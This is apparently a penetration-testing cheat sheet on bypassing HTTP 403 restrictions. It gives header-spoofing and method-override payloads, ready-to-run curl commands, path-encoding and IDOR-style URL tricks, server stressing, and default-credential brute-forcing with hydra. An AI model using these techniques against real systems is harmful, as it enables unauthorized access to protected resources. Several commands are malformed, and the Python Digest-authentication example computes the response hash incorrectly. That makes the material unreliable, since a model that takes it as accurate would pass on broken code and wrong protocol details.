## Bypassing Forbidden Responses (HTTP 403)

To bypass a forbidden response (HTTP 403), you can try various techniques such as:

- **Changing the HTTP method** to GET, HEAD, POST, PUT, DELETE, CONNECT, OPTIONS, TRACE, PATCH, INVENTED or HACK.
- **Changing user agent to:** `User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)`
- **Overriding the HTTP method** using headers like:
    - `X-HTTP-Method-Override: PUT`
	- `X-HTTP-Method-Override: GET`
	- `X-Original-Method: GET`
	- `X-HTTP-Method: POST`
- **Fuzzing HTTP headers** by changing the Host header or using proxy headers like:
    - `X-Forwarded-For: 127.0.0.1`
	- `Origin: <target>`
	- `X-Host: <trusted_host>`
- **Path fuzzing** by encoding (`%61dmin`) or using different cases (`aDmiN`), or appending file extensions like `admin.json`.
- **Bypass 403 Forbidden** (with encoded special charecter) and curl tool:
    - `curl -i https:%2F%2Ftarget.com/admin -H "X-Original-URL: /admin"`
	- `curl -i https3A%2F%2Ftarget.com/admin -X POST -H "X-Custom-IP-Authorization: 127.0.0.1"`
	- `curl curl -H “X-Forwarded-For: 1.1.1.1” <target>`
	- `curl -H “Host: another-allowed-host.com” --resolve “sub.target.com:443:<targetIP>” <target>`
- **Appending slash (/) or backslash (\)**: `/api//users` | `/api\\users`
- **Trying different protocol versions** like HTTP/1.0 or HTTP/2.0.
- **Directly contacting the IP or CNAME** of the domain.
- **Stressing the server with common GET requests** (Many requests).
- **Changing the protocol** from HTTP to HTTPS or vice versa.
- **Bypass on /api/v1/user/id**:
    - `/api/v1/user/id.json`
    - `/api/v1/user/id?`
    - `/api/v1/user/id/`
    - `/api/v2/user/id`
    - `/api/v1/user/id&accountdetail`
    - `/api/v1/user/yourid&victimid`
    - `X-Original-URL: /api/v1/user/id/`
- **Checking the archive.org web archive** for past accessibility of the file:
    - [Web Archive Search](https://web.archive.org/cdx/search/cdx?url=*.example.com&output=text&fl=original&collapse=urlkey)
    - *Note*: Replace `*.example.com` with your target.
- **Parameter manipulation** by changing, adding, or removing URL parameters:
    - **Manipulation by changing**: change the sort parameter from ascending price order to descending price order:
      - `https://example.com/products?category=electronics&sort=price_asc` → `?sort=price_desc`
    - **Adding URL parameter**: add a new parameter called brand to the URL:
      - `https://example.com/products?category=electronics&sort=price_asc&brand=samsung`
    - **Removing URL parameter**: remove the brand parameter:
      - `https://example.com/products?category=electronics&sort=price_asc`
- **Brute-forcing using common credentials** or trying basic, digest, and NTLM authentication (e.g., `admin:admin` | `admin:password` | `test:test`):
    - **Common credentials**: 
      - `Authorization: Basic YWRtaW46YWRtaW4=`  # admin:admin to base64.
    - **NTLM**:
      - `hydra -l admin -P /path/to/passwords.txt ntlm://<TargetIP>`
    - **Digest Authentication**: The client sends an HTTP request to the server like this:
        - `GET /protected-resource HTTP/1.1`
        - `Host: example.com`
        - `Response: HTTP/1.1 401 Unauthorized`
        - `WWW-Authenticate: Digest realm="example.com", qop="auth", nonce="dcd98b7102dd2f0e8b3c5d8b1f6f83f7f2a6c2d89", opaque="5ccc069c403ebaf9f0171e9517f40e41"`
        - **nonce** is a random value sent by the server to ensure that the requests aren't repeated.
        - **opaque** is a fixed encrypted value.
        - **Authorization**:
            - `Digest username="admin", realm="example.com", qop=auth, algorithm=MD5, nonce="dcd98b7102dd2f0e8b3c5d8b1f6f83f7f2a6c2d89", uri="/protected-resource", response="c1d2d4e45d7ad670bb7177b26406d75b", opaque="5ccc069c403ebaf9f0171e9517f40e41"`
            - **username** (Username).
            - **realm** (DomainName).
            - **password** (Password).
            - **nonce** (Random value sent by the server).
            - **uri** (The URL the client wants to access).
            - **response** (The outputs from combining all of the above)
        
        #### How are all these values combined together?
        - `<username>:<realm>:<password>` `<nonce>:<uri>`
        
        ```python
        import hashlib
        
        username = "admin"
        realm = "example.com"
        password = "password123"
        nonce = "dcd98b7102dd2f0e8b3c5d8b1f6f83f7f2a6c2d89"
        uri = "/protected-resource"
        
        data = f"{username}:{realm}:{password}\n{nonce}:{uri}"
        md5_hash = hashlib.md5(data.encode()).hexdigest()
        
        print(md5_hash)  # The output will be the response.
        ```

